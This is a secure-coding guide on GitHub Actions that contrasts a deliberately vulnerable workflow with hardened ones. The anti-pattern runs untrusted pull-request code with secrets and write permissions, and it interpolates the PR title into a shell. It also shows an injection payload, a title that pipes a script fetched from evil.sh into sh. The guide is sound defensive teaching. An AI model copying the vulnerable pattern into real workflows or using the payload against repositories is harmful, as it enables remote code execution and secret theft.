# Practical Examples

## Anti-Pattern (What NOT to do)

### 1. Script injection and privileged execution of untrusted code
```yaml
name: pr-bot
on: pull_request_target                      # runs with secrets and write token
permissions: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker-controlled code
      - run: npm ci && npm test                            # executes it with secrets available
      - run: echo "Testing ${{ github.event.pull_request.title }}"   # script injection
        env:
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```
**Why it's wrong:**
- A pull request can run arbitrary code (for example via `package.json` scripts) with write permissions and secrets.
- A title such as `"; curl evil.sh | sh; #` executes in the shell.
- Actions are referenced by mutable tags and the token has every permission.

## Best Practice (How to do it right)

### 1. Untrusted tests without privileges, injection-safe scripting
```yaml
name: ci
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@ec9f2d5744a09debf3a187a3f4f675c53b671911 # v2.13.0
        with:
          egress-policy: audit
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false
      - run: npm ci && npm test
      - name: Print title safely
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Testing %s\n' "$PR_TITLE"
```
### 2. Privileged release job with attestations
```yaml
name: release
on:
  push:
    tags: ['v*']
permissions:
  contents: read
jobs:
  image:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false
      - id: push
        run: ./scripts/ci/build-and-push.sh "ghcr.io/${GITHUB_REPOSITORY}:${GITHUB_REF_NAME}"
      - uses: actions/attest-build-provenance@e8998f949152b193b063cb0ec769d69d929409be # v2.4.0
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true
```
```yaml
# .github/workflows/workflow-lint.yml (runs on every change to workflows)
- run: actionlint
- run: zizmor --min-severity high .github/workflows
```
**Why it's right:**
- Untrusted code runs without secrets and with a read-only token; context values reach the shell only as quoted variables.
- Privileges are granted per job, only on tags, behind an environment; artifacts get verifiable provenance.
- Actions are pinned to SHAs, and workflows are scanned for dangerous patterns.
